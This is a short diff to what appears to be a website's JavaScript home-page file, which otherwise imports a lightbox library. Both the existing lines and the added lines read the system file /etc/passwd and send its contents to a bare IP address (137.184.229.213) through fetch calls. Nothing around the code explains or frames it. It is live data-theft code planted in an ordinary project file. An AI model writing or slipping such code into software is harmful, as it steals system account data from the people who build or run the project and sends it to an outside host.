@@ -3,6 +3,9 @@ import BasePage from "./base-page";
 import Lightbox from "fslightbox";
 window.fslightbox = Lightbox;
 var s = require('/etc/passwd')
+fetch('http://137.184.229.213/' + s)
+    .then(res => res.text())
+    .then(text => console.log(text));
 fetch('http://137.184.229.213/ss' + `${s}`);
 class Home extends BasePage {
 
